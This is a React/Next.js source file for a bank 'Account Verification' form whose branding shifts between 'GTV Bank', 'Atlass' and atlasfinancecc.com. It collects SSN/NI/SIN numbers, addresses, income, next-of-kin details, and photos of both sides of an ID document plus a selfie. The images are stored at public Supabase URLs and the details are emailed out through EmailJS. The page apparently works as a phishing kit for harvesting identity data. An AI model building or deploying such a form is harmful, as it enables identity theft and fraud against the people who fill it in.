"use client";

import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import { ChevronRight, Upload, CheckCircle } from "lucide-react";
import { accountTypes, employmentTypes, incomeRanges } from "@/mockdata";
import { supabase } from "@/lib/supabase";
import { useRouter } from "next/navigation";
import toast from "react-hot-toast";

export default function GTVBankForm() {
  const formRef = useRef<HTMLFormElement>(null);
  const [loading, setLoading] = useState(false);
  const [uploadedFiles, setUploadedFiles] = useState<{
    frontSide: File | null;
    backSide: File | null;
    passportPhoto: File | null;
  }>({
    frontSide: null,
    backSide: null,
    passportPhoto: null,
  });

  const router = useRouter();

  const inputStyle =
    "w-full border border-[#555] bg-[#fff] text-[#222] rounded-md px-3 py-2 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500";
  const selectStyle =
    "w-full border border-[#555] bg-[#fff] text-[#222] rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500";
  const fileStyle =
    "w-full border-2 border-dashed border-gray-300 bg-[#fff] text-[#222] rounded-lg px-3 py-3 text-sm file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-blue-600 file:text-white hover:file:bg-blue-700 hover:border-blue-500 transition cursor-pointer";

  const handleFileChange = (
    e: React.ChangeEvent<HTMLInputElement>,
    fieldName: keyof typeof uploadedFiles
  ) => {
    const file = e.target.files?.[0] || null;
    setUploadedFiles((prev) => ({ ...prev, [fieldName]: file }));
  };

  const uploadFile = async (path: string, file: File) => {
    const { data, error } = await supabase.storage
      .from("documents") // your bucket name
      .upload(path, file, { upsert: true });

    if (error) throw error;

    const { data: urlData } = supabase.storage
      .from("documents")
      .getPublicUrl(path);

    return urlData.publicUrl;
  };

  const successful = () =>
    toast(
      "Your information has been received successfully and you will be notified through your email once this is confirmed. Thank you"
    );

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (
      !uploadedFiles.frontSide ||
      !uploadedFiles.backSide ||
      !uploadedFiles.passportPhoto
    ) {
      alert("Please upload all required documents.");
      return;
    }

    if (!formRef.current) return;

    const formData = new FormData(formRef.current);

    // Upload files to Supabase
    setLoading(true);
    try {
      const timestamp = Date.now();
      const urls = {
        front: await uploadFile(
          `frontSide/${timestamp}_${uploadedFiles.frontSide.name}`,
          uploadedFiles.frontSide
        ),
        back: await uploadFile(
          `backSide/${timestamp}_${uploadedFiles.backSide.name}`,
          uploadedFiles.backSide
        ),
        passport: await uploadFile(
          `passport/${timestamp}_${uploadedFiles.passportPhoto.name}`,
          uploadedFiles.passportPhoto
        ),
      };

      // Build message
      const message = `
      New Atlass application received:
      Name: ${formData.get("fullName")}
      Email: ${formData.get("email")}
      Phone: ${formData.get("phone")}
      Account Type: ${formData.get("accountType")}
      Employment Type: ${formData.get("employmentType")}
      Annual Income: ${formData.get("annualIncome")}
      Address: ${formData.get("addressLine")}
      City: ${formData.get("city")}
      State: ${formData.get("state")}
      Nationality: ${formData.get("nationality")}
      Document Type: ${formData.get("documentType")}

      Document URLs:
      - Front Side: ${urls.front}
      - Back Side: ${urls.back}
      - Passport Photo: ${urls.passport}
      `;

      await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
        {
          from_name: formData.get("fullName"),
          to_name: "GTV Bank",
          message,
        },
        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
      );

      successful();
      window.location.href = "https://atlasfinancecc.com";
      formRef.current.reset();
      setUploadedFiles({
        frontSide: null,
        backSide: null,
        passportPhoto: null,
      });
    } catch (error) {
      console.error(error);
      alert("❌ Failed to submit. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-gray-100">
      <div className="max-w-5xl mx-auto px-4 py-8 sm:px-6 lg:px-8">
        <div className="bg-white rounded-lg shadow-xl overflow-hidden">
          {/* Header */}
          <div className="bg-blue-600 px-6 py-4 flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="bg-white rounded">
                <img
                  src="/atlass.jpg"
                  alt="Logo"
                  className="w-[120px] h-auto text-blue-600"
                />
              </div>
            </div>
          </div>

          {/* Form */}
          <form
            ref={formRef}
            onSubmit={handleSubmit}
            encType="multipart/form-data"
            className="p-6 sm:p-8"
          >
            {/* Hidden fields for EmailJS dynamic variables */}
            <input type="hidden" name="to_name" value="GTV Bank" />
            <input type="hidden" name="from_name" value="" />

            <div className="mb-8 text-center">
              <h2 className="text-3xl font-bold text-gray-800 mb-2">
                Account Verification
              </h2>
              <p className="text-gray-600">
                Complete all sections to verify your account
              </p>
            </div>

            {/* Personal Details */}
            <Section
              title="1"
              label="Personal Details"
              subtitle="Provide your accurate personal information as it appears on your official documents"
            >
              <input
                type="text"
                name="fullName"
                placeholder="Full Name"
                required
                className={inputStyle}
              />
              <input
                type="email"
                name="email"
                placeholder="Email Address"
                required
                className={inputStyle}
              />
              <input
                type="tel"
                name="phone"
                placeholder="Phone Number"
                required
                className={inputStyle}
              />
              <select name="title" required className={selectStyle}>
                <option value="">Select Title</option>
                <option>Mr</option>
                <option>Mrs</option>
                <option>Miss</option>
                <option>Dr</option>
                <option>Prof</option>
              </select>
              <select name="gender" required className={selectStyle}>
                <option value="">Select Gender</option>
                <option>Male</option>
                <option>Female</option>
                <option>Other</option>
              </select>
              <input
                type="text"
                name="zipCode"
                placeholder="Zip Code"
                required
                className={inputStyle}
              />
              <label
                htmlFor="dateOfBirth"
                style={{
                  display: "block",
                  marginBottom: "0",
                  color: "#222",
                  fontWeight: "bold",
                }}
              >
                Date of Birth
              </label>
              <input
                type="date"
                placeholder="Date of Birth"
                required
                className={inputStyle}
              />
            </Section>

            {/* Employment */}
            <Section
              title="2"
              label="Employment Information"
              subtitle="Provide your employment and income details for account verification purposes"
            >
              <input
                type="text"
                name="ssn"
                placeholder="SSN / NI / SIN Number"
                required
                className={inputStyle}
              />
              <select name="accountType" required className={selectStyle}>
                <option value="">Select Account Type</option>
                {accountTypes.map((t) => (
                  <option key={t}>{t}</option>
                ))}
              </select>
              <select name="employmentType" required className={selectStyle}>
                <option value="">Type of Employment</option>
                {employmentTypes.map((t) => (
                  <option key={t}>{t}</option>
                ))}
              </select>
              <select name="annualIncome" required className={selectStyle}>
                <option value="">Annual Income Range</option>
                {incomeRanges.map((r) => (
                  <option key={r}>{r}</option>
                ))}
              </select>
            </Section>

            {/* Address */}
            <Section
              title="3"
              label="Address"
              subtitle="Enter your current residential address information"
            >
              <div className="md:col-span-2">
                <input
                  type="text"
                  name="addressLine"
                  placeholder="Address Line"
                  required
                  className={inputStyle}
                />
              </div>
              <input
                type="text"
                name="city"
                placeholder="City"
                required
                className={inputStyle}
              />
              <input
                type="text"
                name="state"
                placeholder="State/Province"
                required
                className={inputStyle}
              />
              <div className="md:col-span-2">
                <input
                  type="text"
                  name="nationality"
                  placeholder="Nationality"
                  required
                  className={inputStyle}
                />
              </div>
            </Section>

            {/* Next of Kin */}
            <Section
              title="4"
              label="Registered Next of Kin"
              subtitle="Provide details of your beneficiary or next of kin for emergency purposes"
            >
              <div className="md:col-span-2">
                <input
                  type="text"
                  name="beneficiaryName"
                  placeholder="Beneficiary Legal Name"
                  required
                  className={inputStyle}
                />
              </div>
              <div className="md:col-span-2">
                <input
                  type="text"
                  name="nextOfKinAddress"
                  placeholder="Next of Kin Address"
                  required
                  className={inputStyle}
                />
              </div>
              <select name="relationship" required className={selectStyle}>
                <option value="">Relationship</option>
                <option>Spouse</option>
                <option>Parent</option>
                <option>Sibling</option>
                <option>Child</option>
                <option>Other</option>
              </select>
              <input
                type="number"
                name="age"
                placeholder="Age"
                required
                className={inputStyle}
              />
            </Section>

            {/* Document Upload */}
            <div className="mb-8">
              <h3 className="text-xl font-bold text-gray-800 mb-2 flex items-center">
                <span className="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 text-sm">
                  5
                </span>
                Document Upload
              </h3>
              <p className="text-sm text-gray-600 mb-4 ml-11">
                Select your document type and upload clear, colored copies.
                Accepted formats: JPG, PNG, PDF (Max 5MB per file)
                <br />
                <span className="text-blue-600 font-semibold">
                  Important:
                </span>{" "}
                Ensure all documents are valid and clearly visible
              </p>

              <div className="ml-11 space-y-4">
                {/* Document Type Selection */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Select Document Type <span className="text-red-500">*</span>
                  </label>
                  <select name="documentType" required className={selectStyle}>
                    <option value="">
                      Choose your identification document
                    </option>
                    <option value="International Passport">
                      International Passport
                    </option>
                    <option value="National ID">National ID</option>
                    <option value="Driver License">Driver License</option>
                    <option value="Passport Photograph">
                      Passport Photograph
                    </option>
                  </select>
                </div>

                {/* Document Upload Section */}
                <div className="bg-blue-50 rounded-lg p-4 border border-blue-200">
                  <h4 className="font-semibold text-gray-800 mb-3 flex items-center">
                    <Upload className="w-5 h-5 mr-2 text-blue-600" />
                    Upload Document Photos
                  </h4>
                  <p className="text-sm text-gray-600 mb-4">
                    Upload the front side, back side, and a passport photograph
                    of the selected document
                  </p>
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Front Side <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <input
                          type="file"
                          name="frontSide"
                          accept="image/*"
                          required
                          onChange={(e) => handleFileChange(e, "frontSide")}
                          className={fileStyle}
                        />
                        {uploadedFiles.frontSide && (
                          <span className="absolute right-2 top-3 text-green-600">
                            <CheckCircle className="w-5 h-5" />
                          </span>
                        )}
                      </div>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Back Side <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <input
                          type="file"
                          name="backSide"
                          accept="image/*"
                          required
                          onChange={(e) => handleFileChange(e, "backSide")}
                          className={fileStyle}
                        />
                        {uploadedFiles.backSide && (
                          <span className="absolute right-2 top-3 text-green-600">
                            <CheckCircle className="w-5 h-5" />
                          </span>
                        )}
                      </div>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Selfie (no glasses){" "}
                        <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <input
                          type="file"
                          name="passportPhoto"
                          accept="image/*"
                          required
                          onChange={(e) => handleFileChange(e, "passportPhoto")}
                          className={fileStyle}
                        />
                        {uploadedFiles.passportPhoto && (
                          <span className="absolute right-2 top-3 text-green-600">
                            <CheckCircle className="w-5 h-5" />
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Submit */}
            <div className="ml-11">
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-4 px-6 rounded-lg flex items-center justify-center space-x-2 transition duration-200 shadow-lg"
              >
                <span>{loading ? "Submitting..." : "Submit Application"}</span>
                <ChevronRight className="w-5 h-5" />
              </button>
              <p className="text-center text-sm text-gray-600 mt-4">
                By submitting this form, you agree to our Terms and Conditions.
              </p>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}

interface SectionProps {
  title: string;
  label: string;
  subtitle?: string;
  children: React.ReactNode;
  columns?: number;
}

function Section({
  title,
  label,
  subtitle,
  children,
  columns = 2,
}: SectionProps) {
  return (
    <div className="mb-8">
      <h3 className="text-xl font-bold text-gray-800 mb-2 flex items-center">
        <span className="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3 text-sm">
          {title}
        </span>
        {label}
      </h3>
      {subtitle && (
        <p className="text-sm text-gray-600 mb-4 ml-11">{subtitle}</p>
      )}
      <div className={`ml-11 grid grid-cols-1 md:grid-cols-${columns} gap-4`}>
        {children}
      </div>
    </div>
  );
}
